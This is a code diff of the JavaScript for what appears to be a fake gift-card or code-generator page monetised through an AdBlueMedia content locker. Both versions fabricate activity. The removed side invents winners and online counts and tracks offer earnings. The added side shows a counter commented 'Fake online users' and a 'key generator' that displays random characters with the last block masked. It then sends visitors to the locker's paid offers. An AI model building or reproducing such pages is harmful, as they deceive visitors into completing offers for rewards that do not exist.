-        const name = document.createElement('div'); name.className='name'; name.textContent = w.name;
-        const flag = document.createElement('div'); flag.className='flag-badge'; flag.textContent = w.flag;
-        top.appendChild(name); top.appendChild(flag);
-
-        const bottom = document.createElement('div'); bottom.className='chip-bottom';
-        const prize = document.createElement('div'); prize.className='chip-prize'; prize.textContent = w.prize;
-        const time = document.createElement('div'); time.className='chip-time'; time.textContent = formatTime(w.time);
-        bottom.appendChild(prize); bottom.appendChild(time);
-
-        content.appendChild(top); content.appendChild(bottom);
-        chip.appendChild(av); chip.appendChild(content);
-
-        chip.addEventListener('click', ()=>{ const open = chip.classList.contains('expanded'); document.querySelectorAll('.chip.expanded').forEach(c=>c.classList.remove('expanded')); if(!open) chip.classList.add('expanded'); });
-
-        winnersEl.appendChild(chip);
-      });
-    }
-
-    function addWinner(w){
-      recent.unshift(w);
-      if(recent.length>500) recent.pop();
-      render();
-      if(srAnn) srAnn.textContent = `${w.name} won ${w.prize}`;
-    }
-
-    for(let i=0;i<8;i++){
-      const w = makeWinner();
-      w.time = new Date(Date.now() - (i+1)*45000);
-      addWinner(w);
-    }
-
-    if(recent.length>0 && giftLiveText){
-      giftLiveText.textContent = `${recent[0].name} -- ${recent[0].prize}`;
-    }
-
-    setInterval(()=>{
-      const w = makeWinner();
-      addWinner(w);
-      if(giftLiveText) giftLiveText.textContent = `${w.name} -- ${w.prize}`;
-    }, 3500);
-
-    // ==================== SMOOTH ONLINE COUNT ====================
-    let onlineCount = 900 + Math.floor(Math.random() * 800);
-    if(onlineSmall) onlineSmall.textContent = onlineCount.toLocaleString('en-IN') + ' online';
-
-    function clamp(v, a, b){ return Math.max(a, Math.min(b, v)); }
-
-    function updateOnlineSmooth(){
-      const pct = 0.02 + Math.random()*0.03;
-      let maxStep = Math.round(onlineCount * pct);
-      if(maxStep < 6) maxStep = 6;
-      if(maxStep > 60) maxStep = 60;
-      const delta = Math.floor((Math.random() * (maxStep*2 + 1)) - maxStep);
-      let spike = 0;
-      if(Math.random() < 0.04){
-        spike = (Math.random() < 0.5 ? -1 : 1) * (20 + Math.floor(Math.random()*80));
-      }
-      let next = onlineCount + delta + spike;
-      next = clamp(next, 500, 3000);
-      const smooth = Math.round(onlineCount * 0.6 + next * 0.4);
-      onlineCount = clamp(smooth, 500, 3000);
-      if(onlineSmall) onlineSmall.textContent = onlineCount.toLocaleString('en-IN') + ' online';
-      const nextInterval = 8000 + Math.floor(Math.random() * 6000);
-      setTimeout(updateOnlineSmooth, nextInterval);
-    }
-    setTimeout(updateOnlineSmooth, 9000);
-    window._demoOnline = { get(){ return onlineCount; } };
-
-    // ==================== BLINK HANDLING ====================
-    const media = window.matchMedia('(prefers-reduced-motion: reduce)');
-    function updateBlink(){
-      if(!liveDot) return;
-      if(media.matches){
-        liveDot.classList.remove('blink');
-        liveDot.style.animation='none';
-      } else {
-        liveDot.classList.add('blink');
-        liveDot.style.animation='blink 1000ms linear infinite';
-      }
-    }
-    updateBlink();
-    if(media.addEventListener) media.addEventListener('change', updateBlink);
-
-    // ==================== ADBLUE MEDIA API - FETCH OFFERS ====================
-    function loadOffers() {
-      const offersContainer = document.getElementById('offers');
-      const loadingEl = document.getElementById('offersLoading');
-      
-      const url = ADBLUEMEDIA_CONFIG.feed_url + 
-        '?user_id=' + encodeURIComponent(ADBLUEMEDIA_CONFIG.user_id) +
-        '&api_key=' + encodeURIComponent(ADBLUEMEDIA_CONFIG.api_key) +
-        '&s1=' + encodeURIComponent(ADBLUEMEDIA_CONFIG.s1) +
-        '&s2=' + encodeURIComponent(ADBLUEMEDIA_CONFIG.s2) +
-        '&callback=?';
-
-      // Create script tag for JSONP
-      const script = document.createElement('script');
-      script.src = url;
-      
-      // JSONP callback function
-      window.adbOffersCallback = function(offers) {
-        if (loadingEl) loadingEl.style.display = 'none';
-        
-        if (!offers || !Array.isArray(offers) || offers.length === 0) {
-          offersContainer.innerHTML = '<div class="loading-text">No offers available at the moment. Please refresh.</div>';
-          return;
+        // Fake online users
+        function updateOnlineUsers() {
+            var users = Math.floor(Math.random() * 130) + 250;
+            document.getElementById("user-online").innerHTML = users;
         }
+        updateOnlineUsers();
+        setInterval(updateOnlineUsers, 5000);
 
-        // Trim to num_offers (max 10)
-        offers = offers.slice(0, ADBLUEMEDIA_CONFIG.num_offers);
-        
-        offersContainer.innerHTML = '';
-        
-        offers.forEach(function(offer, index) {
-          const btn = document.createElement('button');
-          btn.className = 'offer';
-          btn.setAttribute('role', 'listitem');
-          btn.setAttribute('data-offer-id', offer.offer_id || '');
-          
-          // Main anchor text
-          const anchorText = document.createElement('div');
-          anchorText.textContent = offer.anchor || 'Complete This Offer';
-          
-          // Description if available
-          if (offer.conversion) {
-            const desc = document.createElement('div');
-            desc.className = 'offer-desc';
-            desc.textContent = offer.conversion;
-            anchorText.appendChild(desc);
-          }
-          
-          // Payout info
-          if (offer.points) {
-            const payout = document.createElement('div');
-            payout.className = 'offer-payout';
-            const dollars = (parseFloat(offer.points) / 100).toFixed(2);
-            payout.textContent = 'Earn $' + dollars;
-            anchorText.appendChild(payout);
-          }
-          
-          btn.appendChild(anchorText);
-          
-          // Click handler - opens offer URL
-          btn.addEventListener('click', function() {
-            const offerUrl = offer.url || '';
-            if (offerUrl && offerUrl.indexOf('http') === 0) {
-              try {
-                const win = window.open(offerUrl, '_blank', 'noopener');
-                if (win) win.opener = null;
-              } catch(e) {
-                console.warn('Could not open offer link', e);
-              }
-            } else {
-              console.warn('Invalid offer URL');
+        function card(cardnum) {
+            document.getElementById("download").style.display = "block";
+            for (var i = 1; i <= 44; i++) {
+                document.getElementById("card" + i).classList.remove("selectedcard");
             }
-          });
-          
-          offersContainer.appendChild(btn);
-        });
-        
-        console.log('AdBlueMedia offers loaded:', offers.length);
-      };
-
-      // Error handling
-      script.onerror = function() {
-        if (loadingEl) loadingEl.style.display = 'none';
-        offersContainer.innerHTML = '<div class="loading-text">Failed to load offers. Please refresh the page.</div>';
-        console.error('Failed to load AdBlueMedia offers');
-      };
-
-      document.head.appendChild(script);
-    }
-
-    // Load offers on page load
-    loadOffers();
-
-    // ==================== REAL LEAD CHECKING ====================
-    const leadStatusEl = document.getElementById('leadStatus');
-    const leadStatusTextEl = document.getElementById('leadStatusText');
-    let totalEarnings = 0;
-    let completedOffers = [];
-    let checkCount = 0;
-
-    function showLeadStatus(message, type) {
-      if (!leadStatusEl || !leadStatusTextEl) return;
-      leadStatusTextEl.textContent = message;
-      leadStatusEl.className = 'lead-status show ' + (type || 'pending');
-      setTimeout(function() {
-        leadStatusEl.classList.remove('show');
-      }, 5000);
-    }
-
-    function checkLeads() {
-      checkCount++;
-      console.log('Checking leads... Attempt #' + checkCount);
-      
-      const url = ADBLUEMEDIA_CONFIG.check_url + '?testing=0&callback=?';
-      
-      const script = document.createElement('script');
-      script.src = url;
-      
-      window.adbLeadsCallback = function(leads) {
-        if (!leads || !Array.isArray(leads)) {
-          console.log('No leads data received');
-          return;
+            document.getElementById("card" + cardnum).classList.add("selectedcard");
+            document.getElementById("imggen").src = document.getElementById("card" + cardnum).src;
         }
-        
-        const completed_leads = leads.length;
-        
-        if (completed_leads > 0) {
-          var offer_ids = [];
-          var earnings_in_cents = 0;
-          
-          leads.forEach(function(lead) {
-            offer_ids.push(parseInt(lead.offer_id));
-            earnings_in_cents += parseFloat(lead.points);
-            console.log('Single lead on offer id ' + lead.offer_id + ' for $' + (parseFloat(lead.points) / 100).toFixed(2));
-          });
-          
-          totalEarnings = earnings_in_cents;
-          completedOffers = offer_ids;
-          
-          var totalDollars = (earnings_in_cents / 100).toFixed(2);
-          
-          console.log('SUMMARY: User has completed ' + completed_leads + ' leads, for $' + totalDollars + ' earnings, on offer ids: ' + offer_ids.join(','));
-          
-          showLeadStatus(
-            'Lead completed! $' + totalDollars + ' earned (' + completed_leads + ' offer' + (completed_leads > 1 ? 's' : '') + ')',
-            'success'
-          );
-          
-          // You can add redirect or unlock logic here
-          // window.location.href = 'https://your-success-page.com';
-          
-        } else {
-          console.log('No leads were found (check #' + checkCount + ')');
+
+        // STEP 1: Click Get Now!
+        function showGenStep() {
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("appbox").style.display = "none";
+            document.getElementById("Gentext").style.display = "block";
+            
+            var myVarCode = setInterval(genkey, 40);
+            var stop = 0;
+            var KeyCode = ["9", "8", "7", "6", "5", "4", "3", "2", "1", "0", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "Z", "Y", "X", "W", "V", "U", "T", "S", "R", "Q", "P", "O", "N", "M"];
+            
+            function genkey() {
+                var key = "";
+                for (var i = 0; i < 36; i++) {
+                    key += KeyCode[Math.floor(Math.random() * 36)];
+                }
+                
+                document.getElementById("Gentext").innerHTML = 
+                    key[5] + key[6] + key[7] + key[8] + "-" + 
+                    key[10] + key[11] + key[12] + key[13] + "-" + 
+                    key[15] + key[16] + key[17] + key[18] + "-" + 
+                    key[20] + key[21] + key[22] + key[23];
+                
+                stop++;
+                if (stop == 40) {
+                    document.getElementById("Gentext").innerHTML = 
+                        key[5] + key[6] + key[7] + key[8] + "-" + 
+                        key[10] + key[11] + key[12] + key[13] + "-" + 
+                        key[15] + key[16] + key[17] + key[18] + "-" + "####";
+                    document.getElementById("button1").style.display = "block";
+                    document.getElementById("Gentext1").style.display = "block";
+                    
+                    // ===== HEADER HIDE WHEN VERIFY STEP COMES =====
+                    document.getElementById("header").classList.add("hidden");
+                    
+                    clearInterval(myVarCode);
+                }
+            }
         }
-      };
-      
-      script.onerror = function() {
-        console.error('Failed to check leads');
-      };
-      
-      document.head.appendChild(script);
-      
-      // Clean up old scripts to prevent memory buildup
-      setTimeout(function() {
-        if (script.parentNode) script.parentNode.removeChild(script);
-      }, 5000);
-    }
 
-    // Start checking leads every 15 seconds
-    setInterval(checkLeads, 15000);
-    
-    // First check after 3 seconds
-    setTimeout(checkLeads, 3000);
+        // STEP 2: Click Verify - opens AdBlueMedia locker
+        function handleVerifyClick() {
+            _iD(); // AdBlueMedia locker open
+        }
 
-    // ==================== TIMER ====================
-    (function(){
-      const timerEl=document.getElementById('timer'); if(!timerEl) return;
-      let end=Date.now()+5*60*1000;
-      const tick=setInterval(()=>{
-        const diff=end-Date.now();
-        if(diff<=0){ timerEl.textContent='00:00'; clearInterval(tick); return; }
-        const m=Math.floor(diff/60000); const s=Math.floor((diff%60000)/1000);
-        timerEl.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-      },250);
-    })();
+        if(typeof window.ga === 'function'){
+            ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+            ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+            ga('customTemplateGlobal.send', 'pageView');
+        }
+    </script>
 
-    // ensure blink keyframes present
-    (function(){ const s=document.createElement('style'); s.textContent='@keyframes blink{0%{opacity:1}50%{opacity:0.15}100%{opacity:1}}'; document.head.appendChild(s); })();
-
-    window._demoRecentWinners = { recent, addWinner, generateUniqueName: generateUniqueName };
-
-  })();
-  </script>
 </body>
 </html>
